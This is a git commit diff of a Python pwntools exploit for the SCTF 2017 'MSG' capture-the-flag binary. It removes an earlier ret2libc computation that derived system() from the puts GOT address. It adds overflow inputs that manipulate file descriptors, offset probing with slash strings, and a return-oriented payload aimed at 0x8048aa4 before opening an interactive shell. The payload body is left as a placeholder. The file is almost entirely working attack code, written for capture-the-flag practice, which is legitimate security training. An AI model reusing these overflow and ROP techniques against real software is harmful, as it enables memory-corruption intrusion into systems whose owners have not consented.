59dca51ba3093da80dea53e6c14e1579d5c93300
DelspoN <delsponn@gmail.com>
2017-07-17 14:37:41 +0900

    new solution

--- sctf2017/MSG/ex.py
+++ sctf2017/MSG/ex.py
@@ -1,26 +1,52 @@
 from pwn import *
 
-p = process("./msg")
+p = process("./MSG")
 print p.recv()
 p.sendline("1")
 print p.recv()
 p.sendline("a"*252+p32(0x00000002))
+# open 3, close stderr(2)
+
 print p.recv()
 p.sendline("1")
 print p.recvuntil("Msg ID : ")
-msgid = p.recvline()
-print msgid
+msgId = p.recvline()
+print msgId
 print p.recv()
+p.sendline("a"*252+p32(0x00000004))
+# open 2, close 4
 
-libc = ELF("/lib/i386-linux-gnu/libc.so.6")
-ret = 0xf7e75ca0 - libc.symbols['puts'] + libc.symbols['system']
-# 0xf7e75ca0 is got address of puts
-ret = p32(ret)
 
-p.sendline(" !"+"a"*(276-2-len('This string is invalid string... : '))+ret)
-# return to sub_8048aa4() ; maybe 'msg : ' is printed
+# ----- For offset ----- #
+dummy = "This string is invalid string... : \n"
+dummyLen = len(dummy)
+
+p.recv()
+p.sendline("3")
+p.recvuntil("Input msg ID :")
+p.sendline("/"*86)
+
+p.recv()
+p.sendline("3")
+p.recvuntil("Input msg ID :")
+p.sendline("/"*80)
+
 print p.recv()
 p.sendline("3")
+print p.recvuntil('Input msg ID : ')
+# --------------------- #
+
+# ROP possible
+payload = "..."
+payload += p32(0x8048aa4)		# print 'msg : '
+print len(payload)
+p.sendline(payload)
 print p.recv()
-p.sendline(msgid)
+
+p.sendline('3')
+print p.recvuntil("Input msg ID : ")
+p.sendline(msgId)
+p.recv()
 p.interactive()
+# Exploit!  
+
